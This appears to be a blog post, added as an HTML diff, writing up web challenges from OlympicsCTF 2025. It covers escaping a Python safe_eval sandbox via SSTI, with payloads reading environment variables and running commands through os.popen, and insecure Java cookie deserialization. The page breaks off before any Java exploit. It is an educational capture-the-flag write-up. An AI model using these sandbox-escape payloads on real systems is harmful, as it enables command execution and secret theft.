@@ -1,0 +1,895 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/macabely.png">
+  <link rel="icon" href="/img/macabely.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Macabely">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Some web challenges i solved in OlympicsCTF 2025">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OlympicsCTF 2025">
+<meta property="og:url" content="https://xyz-macabely.github.io/2025/09/28/olympicsctf/index.html">
+<meta property="og:site_name" content="Macabely">
+<meta property="og:description" content="Some web challenges i solved in OlympicsCTF 2025">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xyz-macabely.github.io/images/ctfs/olympicsctf2025/783f678287dfa769b237a4e8e513ac5b.png">
+<meta property="article:published_time" content="2025-09-27T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-30T11:50:15.660Z">
+<meta property="article:author" content="Macabely">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xyz-macabely.github.io/images/ctfs/olympicsctf2025/783f678287dfa769b237a4e8e513ac5b.png">
+  
+  
+  
+  <title>OlympicsCTF 2025 - Macabely</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyz-macabely.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Macabely</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://x.com/Macabely97021" target="_self">
+                <i class="iconfont icon-twitter-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.linkedin.com/in/ali-hassan-02a479219" target="_self">
+                <i class="iconfont icon-linkedin-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/null') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="OlympicsCTF 2025"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          101 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OlympicsCTF 2025</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20105013.png" srcset="/img/loading.gif" lazyload></p>
+<p>I participated in OlympicsCTF this year and managed to solve some challenges</p>
+<h1 id="Vibe-Web-Mail"><a href="#Vibe-Web-Mail" class="headerlink" title="Vibe Web Mail"></a>Vibe Web Mail</h1><p>This challenge is about an SSTI vulnerability but there is a filter (sandbox) that you need to escape first.</p>
+<p>I start by reading the docker file which has the flag in env variable:</p>
+<div class="code-wrapper"><pre><code class="hljs dockerfile">...
+<span class="hljs-keyword">ENV</span> FLAG=FLAG&#123;ThisIsASampleFlagForTesting123&#125;
+
+<span class="hljs-keyword">COPY</span><span class="language-bash"> requirements.txt .</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> pip install --no-cache-dir -r requirements.txt</span>
+
+<span class="hljs-keyword">COPY</span><span class="language-bash"> app/. .</span>
+
+<span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">5000</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /app/static/images &amp;&amp; <span class="hljs-built_in">chown</span> -R webuser:webuser /app/static</span>
+
+<span class="hljs-keyword">USER</span> webuser
+
+<span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;flask&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, <span class="hljs-string">&quot;--host&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>]</span></code></pre></div>
+
+<p>The app is a simple mail application, where you can send&#x2F;receive mails to users. Looking at the site, you will see a simple login page:</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20105738.png" srcset="/img/loading.gif" lazyload></p>
+<p>You can register and email and login with it, but at the source code i noticed the app itself registering 2 accounts when it starts</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_sample_users</span>():
+    <span class="hljs-keyword">from</span> models <span class="hljs-keyword">import</span> User
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> User.query.filter_by(email=<span class="hljs-string">&#x27;alice@example.com&#x27;</span>).first():
+        user1 = User(username=<span class="hljs-string">&#x27;alice&#x27;</span>, email=<span class="hljs-string">&#x27;alice@example.com&#x27;</span>, password=<span class="hljs-string">&#x27;password123&#x27;</span>)
+        user2 = User(username=<span class="hljs-string">&#x27;bob&#x27;</span>, email=<span class="hljs-string">&#x27;bob@example.com&#x27;</span>, password=<span class="hljs-string">&#x27;securepass&#x27;</span>)
+        db.session.add_all([user1, user2])
+        db.session.commit()
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Sample users created.&quot;</span>)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[=] Sample users already exist.&quot;</span>)
+...</code></pre></div>
+<p>I used the two sample users and logged in with them. After a successful login you will be redirected to <code>/inbox</code> route where you receive your mails if someone send to you.<br>At the <code>/compose</code> route you can send mail to someone. I start by simply send a mail to the other user with a simple SSTI payload:</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20110956.png" srcset="/img/loading.gif" lazyload></p>
+<p>And i got this error message!<br><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20111203.png" srcset="/img/loading.gif" lazyload></p>
+<p>I ran the challenge locally to see what’s going on, i went to the docker logs and see this:</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">[2025-09-29 08:08:24,803] <span class="hljs-built_in">ERROR</span> <span class="hljs-keyword">in</span> utils: Template rendering error: TypeError(<span class="hljs-string">&quot;unhashable type: &#x27;set&#x27;&quot;</span>) <span class="hljs-keyword">while</span> evaluating <span class="hljs-string">&#x27;&#123;&#123;5*5&#125;&#125;&#x27;</span></code></pre></div>
+<p>Interesting! i went to the utils file where the error come from and i saw the error comes exactly from this function</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_email_template</span>(<span class="hljs-params">template_str</span>):
+    <span class="hljs-keyword">try</span>:
+        template = safe_eval(template_str)
+        <span class="hljs-keyword">return</span> template
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        current_app.logger.error(<span class="hljs-string">f&quot;Template rendering error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></code></pre></div>
+
+<p>As you can see there is a <code>safe_eval()</code> function that is used to render the template, we need to see where is this function got created. From the imports above you can see it’s from libs.</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20112059.png" srcset="/img/loading.gif" lazyload></p>
+<p>I went to the libs dir and found a <code>safe_eval.py</code> file. After reading the code, this file is like a sandbox used by the app to evaluate codes running as safe as possible.<br>I will show only the important parts of the file. It has a <code>safe_eval()</code> function that we saw in the utils file, so lets read it to see why it’s raising an error:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_eval</span>(<span class="hljs-params">expr, globals_dict=<span class="hljs-literal">None</span>, locals_dict=<span class="hljs-literal">None</span>, mode=<span class="hljs-string">&quot;eval&quot;</span>, nocopy=<span class="hljs-literal">False</span>, locals_builtins=<span class="hljs-literal">False</span>, filename=<span class="hljs-literal">None</span></span>):
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(expr) <span class="hljs-keyword">is</span> CodeType:
+        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;safe_eval does not allow direct evaluation of code objects.&quot;</span>)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> nocopy:
+        <span class="hljs-keyword">if</span> (globals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(globals_dict) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">dict</span>) \
+                <span class="hljs-keyword">or</span> (locals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(locals_dict) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">dict</span>):
+            _logger.warning(
+                <span class="hljs-string">&quot;Looks like you are trying to pass a dynamic environment, &quot;</span>
+                <span class="hljs-string">&quot;you should probably pass nocopy=True to safe_eval().&quot;</span>)
+        <span class="hljs-keyword">if</span> globals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
+            globals_dict = <span class="hljs-built_in">dict</span>(globals_dict)
+        <span class="hljs-keyword">if</span> locals_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
+            locals_dict = <span class="hljs-built_in">dict</span>(locals_dict)
+
+    check_values(globals_dict)
+    check_values(locals_dict)
+
+    <span class="hljs-keyword">if</span> globals_dict <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+        globals_dict = &#123;&#125;
+
+    globals_dict[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] = <span class="hljs-built_in">dict</span>(_BUILTINS)
+    <span class="hljs-keyword">if</span> locals_builtins:
+        <span class="hljs-keyword">if</span> locals_dict <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
+            locals_dict = &#123;&#125;
+        locals_dict.update(_BUILTINS)
+    c = test_expr(expr, _SAFE_OPCODES, mode=mode, filename=filename)
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">return</span> unsafe_eval(c, globals_dict, locals_dict)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;%r while evaluating\n%r&#x27;</span> % (e, expr))</code></pre></div>
+
+<p>There are some restriction in the code above to make sure that the user input is not doing anything malicious. The most important part is this line:<br><code>globals_dict[&#39;__builtins__&#39;] = dict(_BUILTINS)</code>.  </p>
+<p>This line is making sure that the <code>__builtins__</code> is always assigned to a safe dict <code>_BUILTINS</code> mentioned above in the code that i will show in a sec.  This to make sure that users can’t access the global <code>__builtins__</code> and call sensitive functions to read files or execute commands on the system.  The safe <code>_BUILTINS</code> is like the following:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON">...
+<span class="hljs-keyword">import</span> datetime
+...
+
+unsafe_eval = <span class="hljs-built_in">eval</span>
+...
+
+_BUILTINS = &#123;
+    <span class="hljs-string">&#x27;datetime&#x27;</span>: datetime,
+    <span class="hljs-string">&#x27;True&#x27;</span>: <span class="hljs-literal">True</span>,
+    <span class="hljs-string">&#x27;False&#x27;</span>: <span class="hljs-literal">False</span>,
+    <span class="hljs-string">&#x27;None&#x27;</span>: <span class="hljs-literal">None</span>,
+    <span class="hljs-string">&#x27;bytes&#x27;</span>: <span class="hljs-built_in">bytes</span>,
+    <span class="hljs-string">&#x27;str&#x27;</span>: <span class="hljs-built_in">str</span>,
+    <span class="hljs-string">&#x27;unicode&#x27;</span>: <span class="hljs-built_in">str</span>,
+    <span class="hljs-string">&#x27;bool&#x27;</span>: <span class="hljs-built_in">bool</span>,
+    <span class="hljs-string">&#x27;int&#x27;</span>: <span class="hljs-built_in">int</span>,
+    <span class="hljs-string">&#x27;float&#x27;</span>: <span class="hljs-built_in">float</span>,
+    <span class="hljs-string">&#x27;enumerate&#x27;</span>: <span class="hljs-built_in">enumerate</span>,
+    <span class="hljs-string">&#x27;dict&#x27;</span>: <span class="hljs-built_in">dict</span>,
+    <span class="hljs-string">&#x27;list&#x27;</span>: <span class="hljs-built_in">list</span>,
+    <span class="hljs-string">&#x27;tuple&#x27;</span>: <span class="hljs-built_in">tuple</span>,
+    <span class="hljs-string">&#x27;map&#x27;</span>: <span class="hljs-built_in">map</span>,
+    <span class="hljs-string">&#x27;abs&#x27;</span>: <span class="hljs-built_in">abs</span>,
+    <span class="hljs-string">&#x27;min&#x27;</span>: <span class="hljs-built_in">min</span>,
+    <span class="hljs-string">&#x27;max&#x27;</span>: <span class="hljs-built_in">max</span>,
+    <span class="hljs-string">&#x27;sum&#x27;</span>: <span class="hljs-built_in">sum</span>,
+    <span class="hljs-string">&#x27;reduce&#x27;</span>: functools.reduce,
+    <span class="hljs-string">&#x27;filter&#x27;</span>: <span class="hljs-built_in">filter</span>,
+    <span class="hljs-string">&#x27;sorted&#x27;</span>: <span class="hljs-built_in">sorted</span>,
+    <span class="hljs-string">&#x27;round&#x27;</span>: <span class="hljs-built_in">round</span>,
+    <span class="hljs-string">&#x27;len&#x27;</span>: <span class="hljs-built_in">len</span>,
+    <span class="hljs-string">&#x27;repr&#x27;</span>: <span class="hljs-built_in">repr</span>,
+    <span class="hljs-string">&#x27;set&#x27;</span>: <span class="hljs-built_in">set</span>,
+    <span class="hljs-string">&#x27;all&#x27;</span>: <span class="hljs-built_in">all</span>,
+    <span class="hljs-string">&#x27;any&#x27;</span>: <span class="hljs-built_in">any</span>,
+    <span class="hljs-string">&#x27;ord&#x27;</span>: <span class="hljs-built_in">ord</span>,
+    <span class="hljs-string">&#x27;chr&#x27;</span>: <span class="hljs-built_in">chr</span>,
+    <span class="hljs-string">&#x27;divmod&#x27;</span>: <span class="hljs-built_in">divmod</span>,
+    <span class="hljs-string">&#x27;isinstance&#x27;</span>: <span class="hljs-built_in">isinstance</span>,
+    <span class="hljs-string">&#x27;range&#x27;</span>: <span class="hljs-built_in">range</span>,
+    <span class="hljs-string">&#x27;xrange&#x27;</span>: <span class="hljs-built_in">range</span>,
+    <span class="hljs-string">&#x27;zip&#x27;</span>: <span class="hljs-built_in">zip</span>,
+    <span class="hljs-string">&#x27;Exception&#x27;</span>: Exception,
+&#125;</code></pre></div>
+<p>The safe dict doesn’t have any sensitive functions that we can use, even if it does, there are other functions that checks on user input preventing using of underscore <code>__</code> or any dangerous attributes. After spending some time trying to evade thees filters, the trick was pretty simple. </p>
+<p>I start thinking, what if the <strong>functions&#x2F;classes&#x2F;modules</strong> mentioned in the safe <code>_BUILTINS</code> dict has access on dangerous attributes that we can use to execute commands??!</p>
+<p>looking at the safe <code>_BUILTINS</code> dict which contains the functions&#x2F;modules we can use, hopping to see if any of them has access on sensitive attributes. I start with the <code>datetime</code> module since it’s the only module exist in the dict and cause the <code>hasattr()</code> function doesn’t exist, we goona ise the <code>repr()</code> function instead.</p>
+<p>We gonna send a simple mail containing this message: <code>repr(datetime.sys)</code> to see if the <code>datetime</code> module has the <code>.sys</code> attribute or not. The output we are looking for is something like <code>&lt;module &#39;sys&#39; (built-in)&gt;</code>. By sending the mail, login to the other account to the see the output:</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20123303.png" srcset="/img/loading.gif" lazyload></p>
+<p>Yes! the module has the <code>sys</code> attribute. Now we can simply build the payload and get the flag.</p>
+<p>By sending this payload in the message mail <code>datetime.sys.modules[&#39;os&#39;].environ[&#39;FLAG&#39;]</code> and login to the other account to see the output, you will get the flag.</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20123755.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Vibe-Web-Mail-𝟚"><a href="#Vibe-Web-Mail-𝟚" class="headerlink" title="Vibe Web Mail 𝟚"></a>Vibe Web Mail 𝟚</h1><p>There was a second version of this challenge, i don’t know why?? maybe someone solve the first unintended. It was the same code as the previous one, the only thing changes is the docker file. Instead of assign the flag in an env variable, the flag is read by a <code>readflag.c</code> file and placed in the root dir with a random name:</p>
+<div class="code-wrapper"><pre><code class="hljs r">...
+COPY requirements.txt .
+RUN pip install <span class="hljs-operator">-</span><span class="hljs-operator">-</span>no<span class="hljs-operator">-</span>cache<span class="hljs-operator">-</span>dir <span class="hljs-operator">-</span>r requirements.txt
+
+COPY app<span class="hljs-operator">/</span>. .
+COPY readflag.c <span class="hljs-operator">/</span>
+RUN BINARY_NAME<span class="hljs-operator">=</span><span class="hljs-operator">$</span><span class="hljs-punctuation">(</span>cat <span class="hljs-operator">/</span>dev<span class="hljs-operator">/</span>urandom <span class="hljs-operator">|</span> tr <span class="hljs-operator">-</span>dc <span class="hljs-string">&#x27;a-z0-9&#x27;</span> <span class="hljs-operator">|</span> head <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> <span class="hljs-number">32</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>
+    gcc <span class="hljs-operator">-</span>o <span class="hljs-operator">/</span><span class="hljs-operator">$</span>BINARY_NAME <span class="hljs-operator">/</span>readflag.c <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>
+    chmod <span class="hljs-number">0111</span> <span class="hljs-operator">/</span><span class="hljs-operator">$</span>BINARY_NAME <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">\</span>
+    rm <span class="hljs-operator">/</span>readflag.c
+
+...</code></pre></div>
+
+<p>Since we solve the previous one as intended, we have a free flag here.  Same as the previous exploit, all you need is to list the files in the root dir and read the flag</p>
+<ol>
+<li><code>datetime.sys.modules[&#39;os&#39;].listdir(&#39;/&#39;)</code></li>
+</ol>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20125440.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li><code>datetime.sys.modules[&#39;os&#39;].popen(&#39;/mpwv7nph42b0tlspdnihe34q45gke6tq&#39;).read()</code></li>
+</ol>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20125602.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Secret-Formula"><a href="#Secret-Formula" class="headerlink" title="Secret Formula"></a>Secret Formula</h1><p>This challenge was a simple JAVA deserialization attack. When you go to the challenge url you will see a login page. By registering a new user an login, you will get a cookie:</p>
+<p><img src="/images/ctfs/olympicsctf2025/Screenshot%202025-09-29%20153321.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>Viewing the source code, it’s a single java file (i will only show the important parts)</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;
+    <span class="hljs-keyword">private</span> String email;
+    <span class="hljs-keyword">private</span> String name;
+    <span class="hljs-keyword">private</span> String password;
+    <span class="hljs-keyword">private</span> String lastIp;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String email, String name, String password, String ip)</span>&#123;
+        <span class="hljs-built_in">this</span>.email = email;
+        <span class="hljs-built_in">this</span>.name = name;
+        <span class="hljs-built_in">this</span>.password = password;
+        <span class="hljs-built_in">this</span>.lastIp = ip;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.email;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getLastIp</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.lastIp;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String pass)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.password.equals(pass);
+    &#125;
+
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;
+    &#125;
+&#125;</code></pre></div>
+
+<p>We have a user object that contains four attributes (email, name, password, ip)</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateCookie</span><span class="hljs-params">(User user)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);
+    oos.writeObject(user);
+    oos.close();
+    <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());
+&#125;
+
+<span class="hljs-keyword">private</span> User <span class="hljs-title function_">extractUser</span><span class="hljs-params">(String encoded)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;
+    <span class="hljs-type">byte</span>[] data = Base64.getDecoder().decode(encoded);
+    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));
+    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) ois.readObject();
+    ois.close();
+    <span class="hljs-keyword">return</span> user;
+&#125;</code></pre></div>
+<p>The <code>generateCookie()</code> method takes the <code>User</code> object, serializes it into a byte stream, and then Base64 encodes it to generate a cookie. The <code>extractUser()</code> method dose the exact opposite.  </p>
+<p>The thing is, when using <code>ObjectInputStream.readObject()</code> method on untrusted data, like a cookie that can be modified by a user is notoriously dangerous. An attacker can create their own serialized Java object, encode it, and send it in the cookie. When the server deserializes it, it can lead to Remote Code Execution (RCE).  </p>
+<p>Following the code:</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/secretformula&quot;</span>.equals(path)) &#123;
+            Cookie[] cookies = request.getCookies();
+            <span class="hljs-keyword">if</span>(cookies != <span class="hljs-literal">null</span>)&#123;
+                <span class="hljs-keyword">for</span>(Cookie c : cookies)&#123;
+                    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;user&quot;</span>.equals(c.getName()))&#123;
+                        <span class="hljs-keyword">try</span>&#123;
+                            <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> extractUser(c.getValue());
+                            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;Admin@admin.com&quot;</span>.equals(u.getEmail()))&#123;
+                                response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);
+                                response.getWriter().println(<span class="hljs-string">&quot;&lt;h2&gt;&quot;</span>+extractSecretForumlaFromSafeBox()+<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>);
+                                <span class="hljs-keyword">return</span>;
+                            &#125;
+                        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123; 
+                            <span class="hljs-keyword">return</span>;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;</code></pre></div>
+<p>The <code>/secretformula</code> endpoint is restricted only to users who has the <code>Admin@admin.com</code> email in their cookie after deserialization and then print the <code>extractSecretForumlaFromSafeBox()</code> method’s content on the page.</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">extractSecretForumlaFromSafeBox</span><span class="hljs-params">()</span>&#123;
+    <span class="hljs-keyword">try</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/safebox/secretformula_for_plankton.txt&quot;</span>)));
+    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error&quot;</span>;
+    &#125;
+&#125;</code></pre></div>
